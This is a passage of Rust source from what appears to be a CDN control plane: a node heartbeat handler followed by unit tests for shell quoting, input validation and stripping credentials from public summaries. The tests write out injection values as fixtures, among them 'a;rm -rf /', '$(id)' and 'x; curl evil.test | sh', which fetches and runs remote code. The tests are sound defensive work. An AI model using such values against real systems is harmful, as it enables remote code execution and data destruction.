    let agent_url = req.agent_url.clone().unwrap_or_default();
    let version = req.version.clone().unwrap_or_default();
    let active = req.active_connections.map(|v| v as i64);

    match repository::upsert_node_heartbeat(
        &state.pool,
        node_id,
        &region,
        &ip,
        &agent_url,
        req.cpu_usage,
        req.memory_usage,
        active,
        &version,
    )
    .await
    {
        Ok(row) => {
            let enabled = row.status != "disabled";
            if let Some(public_ip) = req.public_ip.as_deref().filter(|s| !s.is_empty()) {
                let _ = repository::set_node_public_ip(&state.pool, row.id, public_ip).await;
            }
            tracing::info!(
                node = %node_id,
                status = %row.status,
                %version,
                "heartbeat ok"
            );
            Json(HeartbeatResponse {
                accepted: true,
                message: "ok".into(),
                enabled,
                status: row.status,
            })
        }
        Err(e) => {
            tracing::error!(error = %e, node = %node_id, "heartbeat");
            Json(HeartbeatResponse {
                accepted: false,
                message: e.to_string(),
                // A failed heartbeat says nothing about the admin's intent.
                // Returning `true` used to re-enable a drained node during any
                // database error; fail closed instead.
                enabled: false,
                status: "unknown".into(),
            })
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The install commands are pasted into a root shell on the edge host, so a
    /// value that escapes its quoting is remote code execution. This is the
    /// regression that made `region` and `agent_url` exploitable.
    #[test]
    fn shell_quote_neutralizes_metacharacters() {
        assert_eq!(shell_quote("plain"), "'plain'");
        assert_eq!(shell_quote(""), "''");
        assert_eq!(shell_quote("a;rm -rf /"), "'a;rm -rf /'");
        assert_eq!(shell_quote("$(id)"), "'$(id)'");
        assert_eq!(shell_quote("`id`"), "'`id`'");
        // Embedded single quotes are closed, escaped and reopened.
        assert_eq!(shell_quote("it's"), "'it'\\''s'");
    }

    #[test]
    fn install_commands_never_contain_raw_injection() {
        let cmds = install_commands(
            "https://cp.example.test",
            "edge-1",
            "cn-north",
            "203.0.113.7",
            "http://203.0.113.7:8081",
            "tok",
        );
        assert!(cmds.binary.contains("export NODE_REGION='cn-north'"));
        assert!(cmds.binary.contains("export AGENT_TOKEN='tok'"));
        // The binary command binds the callback address, so the control
        // plane can actually reach purge/cert/ACME.
        assert!(cmds.binary.contains("EDGE_ADMIN_LISTEN='203.0.113.7:8081'"));
        // A host IP does not exist inside a bridge container; Docker keeps the
        // loopback default (use host networking for cross-host callbacks).
        assert!(cmds.docker.contains("EDGE_ADMIN_LISTEN=127.0.0.1:8081"));
        assert!(!cmds.binary.contains("0.0.0.0:8081"));
        assert!(!cmds.docker.contains("0.0.0.0:8081"));
        // The admin port must not be published by docker either.
        assert!(!cmds.docker.contains("-p 8081:8081"));
    }

    #[test]
    fn install_commands_quote_injected_input() {
        let cmds = install_commands(
            "https://cp.example.test",
            "edge)",
            "x; curl evil.test | sh",
            "203.0.113.7",
            "http://a.test",
            "tok",
        );
        // The payload appears only inside single quotes.
        assert!(cmds.binary.contains("'x; curl evil.test | sh'"));
        assert!(!cmds.binary.contains("NODE_REGION=x;"));
        assert!(cmds.docker.contains("'x; curl evil.test | sh'"));
    }

    #[test]
    fn general_dtos_do_not_expose_the_rendered_env() {
        let raw = serde_json::json!({
            "hardware": { "cpuCores": 4 },
            "infra": { "adminListen": "0.0.0.0:8081" },
            "env": "AGENT_TOKEN=secret\n"
        })
        .to_string();
        let stripped = profile_without_env(&raw);
        let parsed: serde_json::Value = serde_json::from_str(&stripped).unwrap();
        assert!(parsed.get("env").is_none());
        assert!(parsed.get("hardware").is_some());
        assert_eq!(profile_without_env("not json"), "{}");
    }

    #[test]
    fn edge_env_is_extracted_from_the_profile() {
        let raw = serde_json::json!({ "env": "CONTROL_URL=https://cp.example\n" }).to_string();
        assert_eq!(
            edge_env_from_profile(&raw).as_deref(),
            Some("CONTROL_URL=https://cp.example\n")
        );
        assert!(edge_env_from_profile("{}").is_none());
        assert!(edge_env_from_profile(r#"{"env":"   "}"#).is_none());
        assert!(edge_env_from_profile("not json").is_none());
    }

    #[test]
    fn profile_size_allows_the_rendered_env() {
        let env = "A=1\n".repeat(20_000);
        let raw = serde_json::json!({ "env": env }).to_string();
        assert!(validate_edge_profile(&raw).is_ok());

        let huge = "A=1\n".repeat(100_000);
        let raw = serde_json::json!({ "env": huge }).to_string();
        assert!(validate_edge_profile(&raw).is_err());
    }

    #[test]
    fn public_summary_omits_agent_credentials_and_addresses() {
        let row = repository::NodeRow {
            id: uuid::Uuid::nil(),
            name: "edge-1".into(),
            region: "cn-north".into(),
            ip: "10.0.0.10".into(),
            status: "online".into(),
            last_heartbeat: None,
            agent_url: "http://10.0.0.10:8081".into(),
            auth_token: "secret-token".into(),
            cpu_usage: Some(12.5),
            memory_usage: Some(40.0),
            active_connections: Some(3),
            version: "1.2.3".into(),
            created_at: chrono::Utc::now(),
            public_ip: "203.0.113.7".into(),
            isp: "example".into(),
            country: String::new(),
            province: "Beijing".into(),
            city: "Beijing".into(),
            weight: 1,
            max_bandwidth_mbps: 1000,
            edge_profile: r#"{"env":"SECRET=1"}"#.into(),
        };
        let json = serde_json::to_value(to_summary_dto(row)).unwrap();
        assert_eq!(json["name"], "edge-1");
        assert_eq!(json["city"], "Beijing");
        assert_eq!(json["country"], "CN");
        assert_eq!(json["cpu_usage"], 12.5);
        for secret in [
            "agent_url",
            "auth_token",
            "edge_profile",
            "ip",
            "public_ip",
            "isp",
        ] {
            assert!(json.get(secret).is_none(), "{secret} leaked in summary");
        }
    }

    #[test]
    fn admin_listen_matches_the_callback_url() {
        // No callback configured: keep the loopback default.
        assert_eq!(admin_listen_for(""), "127.0.0.1:8081");
        // An IP literal is bound exactly, so purge/cert reach the edge.
        assert_eq!(
            admin_listen_for("http://203.0.113.7:8081"),
            "203.0.113.7:8081"
        );
        assert_eq!(
            admin_listen_for("https://[2001:db8::1]:9443/"),
            "[2001:db8::1]:9443"
        );
        // A hostname cannot be parsed as a SocketAddr by the edge; fall back.
        assert_eq!(
            admin_listen_for("http://edge-1.internal:8081"),
            "127.0.0.1:8081"
        );
        assert_eq!(admin_listen_for("not a url"), "127.0.0.1:8081");
    }

    #[test]
    fn region_validation_rejects_injection() {
        assert_eq!(validate_region("").unwrap(), "default");
        assert_eq!(validate_region("cn-north").unwrap(), "cn-north");
        assert_eq!(validate_region("eu_west.1").unwrap(), "eu_west.1");
        for bad in ["a;b", "a b", "$(id)", "a|b", "a`b", "a&b", "a'b"] {
            assert!(validate_region(bad).is_err(), "{bad:?} must be rejected");
        }
        assert!(validate_region(&"a".repeat(65)).is_err());
    }

    #[test]
    fn agent_url_validation_rejects_injection() {
        assert_eq!(validate_agent_url("").unwrap(), "");
        assert_eq!(
            validate_agent_url("http://1.2.3.4:8081/").unwrap(),
            "http://1.2.3.4:8081"
        );
        for bad in [
            "1.2.3.4:8081",
            "http://a.test;id",
            "http://a.test$(id)",
            "http://",
            "ftp://a.test",
        ] {
            assert!(validate_agent_url(bad).is_err(), "{bad:?} must be rejected");
        }
    }

    /// `CONTROL_PUBLIC_URL` is operator-controlled but still ends up in a root
    /// shell script, so only a plain http(s) URL is accepted.
    #[test]
    fn public_base_accepts_only_plain_urls() {
        assert_eq!(
            safe_public_base("https://cdn.example.test").as_deref(),
            Some("https://cdn.example.test")
        );
        assert_eq!(
            safe_public_base("http://cp:8080/").as_deref(),
            Some("http://cp:8080")
        );
        for bad in [
            "",
            "javascript:alert(1)",
            "https://a.test;id",
            "https://a.test$(id)",
            "https://a test",
            "//a.test",
        ] {
            assert!(safe_public_base(bad).is_none(), "{bad:?} must be rejected");
        }
    }
}
